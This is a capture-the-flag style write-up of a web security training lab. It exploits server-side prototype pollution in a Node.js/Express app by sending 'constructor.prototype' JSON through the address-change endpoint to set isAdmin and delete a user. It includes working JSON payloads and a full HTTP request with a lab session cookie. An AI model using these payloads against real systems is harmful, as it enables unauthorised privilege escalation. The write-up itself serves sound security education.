## Bypassing flawed input filters for server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user carlos.

You can log in to your own account with the following credentials: wiener:peter

Note :

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Notes

- /admin
- /login
- Billing and Delivery form

## Resume

1. Log in as `wiener:peter`.
2. Submit the address form and capture `POST /my-account/change-address`.
3. Confirm prototype pollution with `json spaces`.
4. Use `constructor.prototype.isAdmin = true`.
5. Refresh the page, open `/admin`, and delete `carlos`.

## Solve

When you submit the billing/delivery address form, the browser sends JSON to:

```http
POST /my-account/change-address
```

The server replies with a JSON object that contains  user data and the updated address fields. That makes this request the best place to test for server-side prototype pollution because the backend is clearly merging  JSON into an object and then reusing it in the response.

first tested a harmless prototype key:

```json
"__proto__": {
  "json spaces": 10
}
```

In the raw response, the indentation did not change, so that vector was not the useful one here.

Then switched to the constructor path:

```json
"constructor": {
  "prototype": {
    "json spaces": 10
  }
}
```

This time the raw response became more indented, which confirms the server is reading `json spaces` from the polluted prototype chain. That is the proof that the application is vulnerable.

The response also exposes an `isAdmin` property, which is currently `false`. If the application trusts inherited `isAdmin`, we can escalate privileges by making it evaluate to `true`.

Replace the harmless `json spaces` pollution with:

```json
"constructor": {
  "prototype": {
    "isAdmin": true
  }
}
```

Request should look like this:

```http
POST /my-account/change-address HTTP/2
Host: 0acf00b40439e7668081d5db00d900ac.web-security-academy.net
Cookie: session=hOEIMAm8gt7puHwzA4Et0GNNiq6myAco
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"hOEIMAm8gt7puHwzA4Et0GNNiq6myAco",
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

response showed:

```json
"isAdmin": true
```

That means the object did not have its own `isAdmin` property, and instead inherited it from the polluted prototype.

After sending the polluted request, refresh the browser page. We should now see a link to the admin panel. Open `/admin`, delete `carlos`, and the lab is solved.